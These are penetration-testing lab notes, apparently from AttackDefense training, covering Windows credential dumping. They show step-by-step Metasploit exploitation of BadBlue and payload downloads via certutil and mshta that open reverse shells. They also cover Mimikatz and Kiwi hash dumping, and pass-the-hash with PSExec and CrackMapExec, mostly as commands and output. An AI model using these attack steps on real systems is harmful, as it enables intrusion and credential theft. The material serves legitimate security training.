# 🔬Windows Credentials Dumping

## Lab 1 - Unattended Files <a href="#lab-1-unattended-files" id="lab-1-unattended-files"></a>

> 🔬 [Unattended Installation](https://attackdefense.com/challengedetails?cid=2106)
>
> * Target IP: `10.0.17.233`
> * Searching for password in Windows Configuration files
> * Both Kali Machine and Attacker/Victim Windows machine are provided

* On the Attacker machine check the current user

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

* From the Kali machine, generate a `meterpreter` x64 payload

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Set up a web server to host the payload

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Download the payload file on the target system using the `certutil` tool in `cmd`

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Stop the http server and start `msfconsole` on the Kali machine
* Execute the `payload.exe` on the Win target system and check the reverse shell on Kali

<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Manually search for the **`unattend.xml`** file, it should be inside
  * `C:\\Windows\\Panther`

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* In a new terminal tab

```bash
cat unattend.xml
```

<figure><img src="../../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Get Access

`administrator` user configured base64 password is **`QWRtaW5AMTIz`**

* Save it to a new file
* Decode it using the `base64` tool

<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Test the `administrator`:`Admin@123root` credentials with the `psexec` tool

```bash
psexec.py administrator@10.0.17.233
```

<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### [Powersploit](https://github.com/PowerShellMafia/PowerSploit)

<figure><img src="../../../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Run the `powerup.ps1` Powershell script to find privilege escalation vulnerability on target machine powershell.

```bash
cd .\Desktop\PowerSploit\Privesc\
ls
```

<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Import `PowerUp.ps1` script and Invoke-PrivescAudit function.

```bash
powershell -ep bypass (PowerShell execution policy bypass)
. .\PowerUp.ps1
Invoke-PrivescAudit
```

<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Cat out the file
* Decoding administrator password using Powershell.

```powershell
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password
```

<figure><img src="../../../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Run a command prompt as an administrator user using discover credentials.

```powershell
runas.exe /user:administrator cmd
Admin@123
whoami
```

<figure><img src="../../../../../.gitbook/assets/image (17) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



```bash
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

> “This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell..”

<figure><img src="../../../../../.gitbook/assets/image (19) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Copy the generated payload i.e `“http://10.10.21.2:8080/upJ4YOZ3WBfCD.hta”` and run it on `cmd.exe` with mshta command to gain the meterpreter shell.

<figure><img src="../../../../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
sessions -i 1
cd /
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```

{% hint style="success" %}
Flag: `097ab83639dce0ab3429cb0349493f60`
{% endhint %}

***

## Lab 2 - Kiwi + Mimikatz

> 🔬 [Windows: Meterpreter: Kiwi Extension](https://attackdefense.com/challengedetails?cid=2340)
>
> * Target IP: `10.0.17.5`
> * Dumping passwords hashes with **mimikatz**
> * Both Kali Machine and Attacker/Victim Windows machine are provided

### Enumeration

```bash
nmap 10.0.17.5
```

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-07 21:32 IST
Nmap scan report for 10.0.17.5
Host is up (0.0020s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds
```

```bash
nmap -sV -p80 10.0.17.5
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

<figure><img src="../../../../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

```bash
msfconsole -q
msf6 > search badblue
```

```bash
Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/badblue_passthru
```

```bash
msf6 > use exploit/windows/http/badblue_passthru
msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.17.5
msf6 exploit(windows/http/badblue_passthru) > exploit
```

```bash
[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.0.17.5
[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.0.17.5:49595) at 2024-07-07 21:38:36 +0530

meterpreter > 
```

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > migrate -N lsass.exe
```

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Hash Dumping - Kiwi <a href="#hash-dumping-kiwi" id="hash-dumping-kiwi"></a>

```bash
load kiwi
?
```

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Retrieve all credentials

```bash
meterpreter > creds_all
```

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Administrator User NTLM Hash: `e3c61a68f1b89ee6c8ba9507378dc88d`
{% endhint %}

* Dump LSA SAM (NTLM hashes for all users)

```bash
meterpreter > lsa_dump_sam
```

<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Student User NTLM Hash: `bd4ca1fbe028f3c5066467a7f6a73b0b`
{% endhint %}

* Dump LSA secrets. This could provide with clear-text passwords

```bash
meterpreter > lsa_dump_secrets 
```

<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Syskey: `377af0de68bdc918d22c57a263d38326`
{% endhint %}

### Hash Dumping - Mimikatz

```bash
meterpreter > cd C:\\
meterpreter > mkdir Temp
meterpreter > cd Temp
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
meterpreter > shell
```

<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Run `mimikatz.exe`

<figure><img src="../../../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Dump the cache of the `lsass` process

```bash
mimikatz # lsadump::sam
```

<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
mimikatz # lsadump::secrets
```

<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Display logon passwords, when stored in clear-text
  * in this case clear-text password are disabled - `(null)`

```bash
mimikatz # sekurlsa::logonPasswords
```

<figure><img src="../../../../../.gitbook/assets/image (16) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Lab 3 - Pass-the-hash <a href="#lab-3-pass-the-hash" id="lab-3-pass-the-hash"></a>

> 🔬 [Windows: Meterpreter: Kiwi Extension](https://attackdefense.com/challengedetails?cid=2340) - same lab as Lab 2
>
> * Target IP changed: `10.0.19.45`
> * Use **Pass-the-hash** attack
> * Both Kali Machine and Attacker/Victim Windows machine are provided

### Enumeration <a href="#enumeration-and-exploitation-1" id="enumeration-and-exploitation-1"></a>

```bash
nmap 10.0.19.45
```

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-08 20:03 IST
Nmap scan report for 10.0.19.45
Host is up (0.0018s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 5.34 seconds
```

```bash
nmap -sV -p80 10.0.19.45
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Exploitation

```bash
msfconsole -q
msf6 > search badblue
msf6 > use exploit/windows/http/badblue_passthru
msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.19.45
msf6 exploit(windows/http/badblue_passthru) > exploit
```

<figure><img src="../../../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

### Hash Dumping - Kiwi <a href="#hash-dumping-kiwi-1" id="hash-dumping-kiwi-1"></a>

```bash
load kiwi
lsa_dump_sam
```

<figure><img src="../../../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

> 📌 Save users NTLM hashes in a text file for future use
>
> `Administrator: e3c61a68f1b89ee6c8ba9507378dc88d`
>
> `student: bd4ca1fbe028f3c5066467a7f6a73b0b`

### Pass-the-hash PSExec <a href="#pass-the-hash-psexec" id="pass-the-hash-psexec"></a>

```bash
hashdump
```

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

<figure><img src="../../../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

* LM+NTLM hash is necessary, so copy the string:

`aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d`

* **Use PSExec to login with `Administrator` user and its password hashes**

<figure><img src="../../../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

```bash
meterpreter > background
msf6 exploit(windows/http/badblue_passthru) > search psexec
msf6 exploit(windows/http/badblue_passthru) > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > options
msf6 exploit(windows/smb/psexec) > sessions 
msf6 exploit(windows/smb/psexec) > set LPORT 4422
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.0.19.45
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
msf6 exploit(windows/smb/psexec) > exploit
```

<figure><img src="../../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

```bash
crackmapexec smb 10.0.19.45 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "whoami"
```

<figure><img src="../../../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

```bash
crackmapexec smb 10.0.19.45 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "ipconfig"
```

<figure><img src="../../../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>











